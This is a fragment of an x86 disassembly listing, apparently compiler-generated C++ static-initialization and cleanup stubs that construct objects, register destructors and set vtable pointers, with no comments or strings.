  438026:	lea    ecx,[ebp-0x10]
  438029:	jmp    0x42d334
  43802e:	push   DWORD PTR [ebp-0x14]
  438031:	call   0x42e750
  438036:	pop    ecx
  438037:	ret    
  438038:	mov    eax,0x43bdb0
  43803d:	jmp    0x42ed26
  438042:	lea    ecx,[ebp-0x28]
  438045:	jmp    0x42aec1
  43804a:	mov    eax,0x43be34
  43804f:	jmp    0x42ed26
  438054:	mov    eax,0x43bfd8
  438059:	jmp    0x42ed26
  43805e:	mov    eax,0x43c028
  438063:	jmp    0x42ed26
  438068:	mov    eax,0x43c078
  43806d:	jmp    0x42ed26
  438072:	mov    eax,0x43c0c8
  438077:	jmp    0x42ed26
  43807c:	mov    eax,0x43c118
  438081:	jmp    0x42ed26
  438086:	mov    eax,0x43c168
  43808b:	jmp    0x42ed26
  438090:	mov    eax,0x43c1b8
  438095:	jmp    0x42ed26
  43809a:	mov    ecx,0x43f8dc
  43809f:	call   0x42d2b9
  4380a4:	push   0x4381f7
  4380a9:	call   0x42f2e0
  4380ae:	pop    ecx
  4380af:	ret    
  4380b0:	call   0x42f2f2
  4380b5:	add    eax,0x20
  4380b8:	push   eax
  4380b9:	mov    ecx,0x43f880
  4380be:	call   0x42befc
  4380c3:	push   0x43821d
  4380c8:	call   0x42f2e0
  4380cd:	pop    ecx
  4380ce:	ret    
  4380cf:	push   0x1
  4380d1:	push   0x0
  4380d3:	push   0x43f880
  4380d8:	mov    ecx,0x43f8e0
  4380dd:	call   0x42ce47
  4380e2:	push   0x438201
  4380e7:	call   0x42f2e0
  4380ec:	pop    ecx
  4380ed:	ret    
  4380ee:	mov    ecx,0x43f8dd
  4380f3:	jmp    0x42cdd3
  4380f8:	mov    ecx,0x43f974
  4380fd:	call   0x42d2b9
  438102:	push   0x438227
  438107:	call   0x42f2e0
  43810c:	pop    ecx
  43810d:	ret    
  43810e:	call   0x42f2f2
  438113:	push   eax
  438114:	mov    ecx,0x43f918
  438119:	call   0x42befc
  43811e:	push   0x43824d
  438123:	call   0x42f2e0
  438128:	pop    ecx
  438129:	ret    
  43812a:	push   0x1
  43812c:	push   0x0
  43812e:	push   0x0
  438130:	push   0x43f918
  438135:	mov    ecx,0x43f978
  43813a:	call   0x42bc13
  43813f:	push   0x438231
  438144:	call   0x42f2e0
  438149:	pop    ecx
  43814a:	ret    
  43814b:	mov    ecx,0x43f975
  438150:	jmp    0x42cea9
  438155:	push   0x438257
  43815a:	call   0x42f2e0
  43815f:	pop    ecx
  438160:	ret    
  438161:	mov    ecx,0x43fa3c
  438166:	call   0x42d2b9
  43816b:	push   0x438261
  438170:	call   0x42f2e0
  438175:	pop    ecx
  438176:	ret    
  438177:	call   0x42f2f2
  43817c:	add    eax,0x40
  43817f:	push   eax
  438180:	mov    ecx,0x43f9e0
  438185:	call   0x42befc
  43818a:	push   0x438287
  43818f:	call   0x42f2e0
  438194:	pop    ecx
  438195:	ret    
  438196:	push   0x1
  438198:	push   0x0
  43819a:	push   0x43f9e0
  43819f:	mov    ecx,0x43fa40
  4381a4:	call   0x42ce47
  4381a9:	push   0x43826b
  4381ae:	call   0x42f2e0
  4381b3:	pop    ecx
  4381b4:	ret    
  4381b5:	mov    ecx,0x43fa3d
  4381ba:	jmp    0x42d285
  4381bf:	mov    ecx,0x43fad8
  4381c4:	call   0x42d2b9
  4381c9:	push   0x438291
  4381ce:	call   0x42f2e0
  4381d3:	pop    ecx
  4381d4:	ret    
  4381d5:	mov    ecx,0x43fb24
  4381da:	call   0x42d2b9
  4381df:	push   0x43829b
  4381e4:	call   0x42f2e0
  4381e9:	pop    ecx
  4381ea:	ret    
  4381eb:	push   0x4382a5
  4381f0:	call   0x42f2e0
  4381f5:	pop    ecx
  4381f6:	ret    
  4381f7:	mov    ecx,0x43f8dc
  4381fc:	jmp    0x42d2e8
  438201:	mov    eax,ds:0x43f8e0
  438206:	mov    eax,DWORD PTR [eax+0x4]
  438209:	mov    DWORD PTR [eax+0x43f8e0],0x4391f0
  438213:	mov    ecx,0x43f8e4
  438218:	jmp    0x42af00
  43821d:	mov    ecx,0x43f880
  438222:	jmp    0x42b2c3
  438227:	mov    ecx,0x43f974
  43822c:	jmp    0x42d2e8
  438231:	mov    eax,ds:0x43f978
  438236:	mov    eax,DWORD PTR [eax+0x4]
  438239:	mov    DWORD PTR [eax+0x43f978],0x4392c4
  438243:	mov    ecx,0x43f980
  438248:	jmp    0x42af00
  43824d:	mov    ecx,0x43f918
  438252:	jmp    0x42b2c3
  438257:	mov    ecx,0x43f9c4
  43825c:	jmp    0x40119a
  438261:	mov    ecx,0x43fa3c
  438266:	jmp    0x42d2e8
  43826b:	mov    eax,ds:0x43fa40
  438270:	mov    eax,DWORD PTR [eax+0x4]
  438273:	mov    DWORD PTR [eax+0x43fa40],0x4391f0
  43827d:	mov    ecx,0x43fa44
  438282:	jmp    0x42af00
  438287:	mov    ecx,0x43f9e0
  43828c:	jmp    0x42b2c3
  438291:	mov    ecx,0x43fad8
  438296:	jmp    0x42d2e8
  43829b:	mov    ecx,0x43fb24
  4382a0:	jmp    0x42d2e8
  4382a5:	mov    ecx,0x43fb25
  4382aa:	jmp    0x42d91d
  4382af:	mov    ecx,0x43fb28
  4382b4:	jmp    0x42d969
